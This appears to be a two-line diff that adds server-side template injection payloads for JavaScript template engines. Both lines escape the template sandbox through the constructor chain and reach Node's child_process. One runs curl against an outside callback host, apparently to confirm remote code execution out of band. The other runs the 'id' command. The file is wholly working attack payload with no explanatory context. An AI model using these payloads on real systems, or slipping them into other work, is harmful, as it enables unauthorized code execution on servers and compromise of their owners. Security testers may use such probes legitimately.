@@ -1,0 +1,2 @@
+P1={{ "".constructor.constructor("return process")().mainModule.require("child_process").execSync("curl -s http://rce.lc/bs-rce-probe1 >/dev/null").toString() }}
+P2={{ cycler.__proto__.constructor("return process")().mainModule.require("child_process").execSync("id").toString() }}
